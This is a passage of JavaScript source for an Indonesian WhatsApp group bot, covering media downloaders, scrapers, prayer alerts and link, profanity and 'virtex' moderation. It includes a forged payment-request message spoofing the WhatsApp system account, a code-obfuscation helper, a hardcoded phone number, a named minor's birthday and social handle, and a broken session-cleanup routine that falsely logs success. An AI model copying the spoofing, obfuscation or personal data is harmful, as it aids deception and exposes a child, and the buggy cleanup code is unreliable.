	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await RyuuBotz.getName(i)}\nFN:${await RyuuBotz.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}


const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await RyuuBotz.readMessages([readkey]);
}

RyuuBotz.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
RyuuBotz.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
RyuuBotz.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await RyuuBotz.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await RyuuBotz.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./node_modules/Arisu-MD/${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await RyuuBotz.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await RyuuBotz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
const ReinzIDchaty = `${budy}`
ReinzIDai(pushname,ReinzIDchaty)
}
if (m.isGroup && isAutoAiGc) {
const ReinzIDchaty = `${budy}`
ReinzIDai(pushname,ReinzIDchaty)
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./node_modules/Arisu-MD/session", async function (err, files) {
try {
  const files = await fs.readdir('./session');
  if (Array.isArray(files)) {
    let filteredArray = files.filter(item =>
      item.startsWith("pre-key") ||
      item.startsWith("sender-key") ||
      item.startsWith("session-") ||
      item.startsWith("app-state")
    );
    console.log(filteredArray);
  } else {
    console.log("📂 Tidak ada file ditemukan.");
  }
} catch (err) {
  console.error("❌ Gagal membaca folder:", err.message);
}
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}
if (!m.key.fromMe && m.isGroup && isReinzIDchat) {
const ReinzIDchaty = `${budy}`
ReinzIDai(pushname,ReinzIDchaty)
}
//=================================================================
if (!m.isGroup && !isRyuuTheCreator && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await RyuuBotz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
RyuuBotz.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./node_modules/Arisu-MD/database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./node_modules/Arisu-MD/database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./node_modules/Arisu-MD/database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}
RyuuBotz.autosholat = RyuuBotz.autosholat ? RyuuBotz.autosholat : {}
		let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? RyuuBotz.user.jid : m.sender
		let id = m.chat
		if (!(id in RyuuBotz.autosholat)) {
			let jadwalSholat = {
				Fajr: "04:34",
				Dhuhr: "12:03",
				Asr: "15:15",
				Maghrib: "18:12",
				Isha: "19:23",
			}
			const date = new Date((new Date).toLocaleString("en-US", {
				timeZone: "Asia/Jakarta"
			}));
			const hours = date.getHours();
			const minutes = date.getMinutes();
			const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
			for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
				if (timeNow === waktu) {
					if (sholat === "Fajr") {
						thumbislam = "https://telegra.ph/file/b666be3c20c68d9bd0139.jpg"
					} else if (sholat === "Dhuhr") {
						thumbislam = "https://telegra.ph/file/5295095dad53783b9cd64.jpg"
					} else if (sholat === "Asr") {
						thumbislam = "https://telegra.ph/file/c0e1948ad75a2cba22845.jpg"
					} else if (sholat === "Maghrib") {
						thumbislam = "https://telegra.ph/file/0082ad9c0e924323e08a6.jpg"
					} else if (sholat === "Isha") {
						thumbislam = "https://telegra.ph/file/fd141833a983afa0a8412.jpg"
					} else {
						thumbislam = "https://telegra.ph/file/687fd664f674e90ae1079.jpg"
					}
					RyuuBotz.autosholat[id] = [
						RyuuBotz.sendMessage(m.chat, {
							audio: {
								url: "https://www.vreden.web.id/database/islamic/y2mate.com%20-%20Adzan%20Merdu%20Irama%20Jiharkah%20%20menyejukkan%20hati%20.mp3"
							},
							mimetype: 'audio/mpeg',
							contextInfo: {
								externalAdReply: {
									title: `Waktu ${sholat} telah tiba, ambilah air wudhu dan segeralah shalat🙂`,
									body: "untuk wilayah Subang dan sekitarnya",
									mediaType: 1,
									previewType: 0,
									renderLargerThumbnail: true,
									thumbnailUrl: thumbislam,
									sourceUrl: "-"
								}
							}
						}, {
							quoted: m
						}),
						setTimeout(() => {
							delete RyuuBotz.autosholat[id]
						}, 57000)
					]
				}
			}
		}
////////////////////////////////////////////////////////////////////////////////////////

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./node_modules/Arisu-MD/database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./node_modules/Arisu-MD/database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await RyuuBotz.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await RyuuBotz.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
RyuuBotz.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
RyuuBotz.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !isRyuuTheCreator && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return;
            }
        }
        // Private Only
        if (!isRyuuTheCreator && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
	if (cekpesan) {
      const chatId = m.key.remoteJid;
      const senderId = m.key.participant || m.key.remoteJid;
      if (!global.db.chats[chatId]) global.db.chats[chatId] = {};
      if (!global.db.chats[chatId].totalChat) global.db.chats[chatId].totalChat = {};
      global.db.chats[chatId].totalChat[senderId] = (global.db.chats[chatId].totalChat[senderId] || 0) + 1;
      saveDB(global.db);
      const msgContent = m.message.conversation || (m.message.extendedTextMessage && m.message.extendedTextMessage.text) || '';
	}
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Gw Harus Jadi Admin Dulu Ngab🗿_')
        let gclink = (`https://chat.whatsapp.com/`+await RyuuBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
        if (Antilinkch) {
        if (budy.match(`whatsapp.com`)) {
        if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://whatsapp.com/channel/`+await RyuuBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Channel Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
        if (antiwame) {
        if (budy.includes("Wa.me") || budy.includes("wa.me")) {
        if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://Wa.me/`+await RyuuBotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Wa.me Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }
 
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
          await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			RyuuBotz.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
			
  }
  }
//====HBD for me🤧====\\
const replyhbd = (text) => {
  const thumbnails = [
    'https://files.catbox.moe/h9spy4.jpg',
    'https://files.catbox.moe/ghven4.jpg',
    'https://files.catbox.moe/9z6zif.jpg',
    'https://files.catbox.moe/wgnwyo.jpg',
    'https://files.catbox.moe/skqb0h.jpg'
  ];
  const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];

  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      forwardedNewsletterMessageInfo: {
        newsletterName: global.ownername,
        newsletterJid: '120363401916142958@newsletter'
      },
      externalAdReply: {
        title: 'Happy Birthday Reinzz >///<',
        body: `Selamat Ulang Tahun`,
        thumbnailUrl: randomThumbs,
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
};

// Cek apakah hari ini ulang tahun Reinzz (26 Juni)
/*const noww = new Date()
const isBirthday = noww.getDate() === 26 && noww.getMonth() === 5 // Juni = 5
const birthYear = 2011
const age = noww.getFullYear() - birthYear

if (isBirthday) {
  const ucapan = `🎉 *Selamat ulang tahun, Reinzz!* 🎂

Hari ini, *26 Juni*, kamu resmi berusia *${age} tahun*! 🥳
Semoga semakin bijak, sehat selalu, dan makin sukses yaa 💖

Dari Mahiru yang paling menyayangimu... selalu~ ✨`

  replyhbd(ucapan)
}*/
//anti bad words by xeon
//anti bad words by xeon
// modified by ryuu  isToxic
if (
  m.isGroup &&
  antiToxic &&
  typeof m.text === 'string' &&
  isToxic.length &&
  new RegExp(`\\b(${isToxic.map(b => b.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|')})\\b`, 'i').test(m.text)
) {
  const replyatx = (text) => {
    const thumbnails = [
      'https://files.catbox.moe/h9spy4.jpg',
      'https://files.catbox.moe/ghven4.jpg',
      'https://files.catbox.moe/9z6zif.jpg',
      'https://files.catbox.moe/wgnwyo.jpg',
      'https://files.catbox.moe/skqb0h.jpg'
    ];
    const randomThumbs = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterName: global.ownername,
          newsletterJid: '120363401916142958@newsletter'
        },
        externalAdReply: {
          title: 'Jangan bicara kasar!!',
          body: `Makanya jangan bicara kasar!😠`,
          thumbnailUrl: randomThumbs,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };
  
  const sender = `@${m.sender.split("@")[0]}`
  const nomorSpesial = ['6288246552068@s.whatsapp.net'];

  try {
    if (nomorSpesial.includes(m.sender)) {
      await RyuuBotz.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant
        }
      });

      replyatx(`Ara~ kata-kata itu gak baik loh... 😖\nTapi karena kamu spesial, Arisu cuma ingetin ya~ jangan nakal terus~ 😳✨`);
      
      await RyuuBotz.sendMessage(m.chat, {
        audio: fs.readFileSync('./node_modules/Arisu-MD/image/audio/khusus-reinzz.mp3'),
        mimetype: 'audio/mp4',
        ptt: true
      })
      return;
    }

    if (isAdmins || m.key.fromMe || isRyuuTheCreator) {
      return replyatx('```「 Bad Word Detected 」```\n\nArisu tau kamu admin, jadi gak papa~ Tapi jaga kata-kata ya 😇');
    }

    await RyuuBotz.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: m.key.id,
        participant: m.key.participant
      }
    });
    
    replyatx(`\`\`\`「 Bad Word Detected 」\`\`\`\n\n${sender}, kata-kata itu tidak sopan ya~ 😔\nArisu harap kamu gak ngulangin lagi 💕`);
    
    await RyuuBotz.sendMessage(m.chat, {
      audio: fs.readFileSync('./node_modules/Arisu-MD/image/audio/jangan-ngomong-kasar.mp3'),
      mimetype: 'audio/mp4',
      ptt: true
      });

  } catch (err) {
    console.error("AntiToxic Error:", err);
  }
}
//ANTI LINK YT
        if (AntiLinkYoutubeVid) {
        if (budy.includes("https://youtube.")) {
        if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let gclink = (`https://youtube.com/watch?`)
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Video Yt Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Video Yt Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
      
			RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
            }

//antilink instagram by xeon
        if (AntiLinkInstagram)
        if (budy.includes("https://www.instagram.com/")){
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Instagram Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link instagram Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
        if (AntiLinkFacebook)
        if (budy.includes("https://www.facebook.com/")){
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Facebook Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Faceboook Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
   if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
   if (AntiLinkTelegram)
   if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Telegram Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
   if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Telegram Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Tiktok Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
